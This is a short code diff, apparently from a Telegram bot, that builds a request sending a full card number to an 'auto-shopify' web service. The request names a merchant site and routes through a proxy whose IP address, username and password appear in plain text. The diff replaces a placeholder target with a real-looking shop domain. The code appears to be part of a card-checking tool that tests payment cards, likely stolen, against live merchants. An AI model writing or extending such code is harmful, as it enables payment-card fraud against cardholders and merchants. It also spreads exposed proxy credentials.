@@ -3069,7 +3069,7 @@ async def process_rz1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://razorpay.example.com"
+            f"?site=https://taroob.com"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
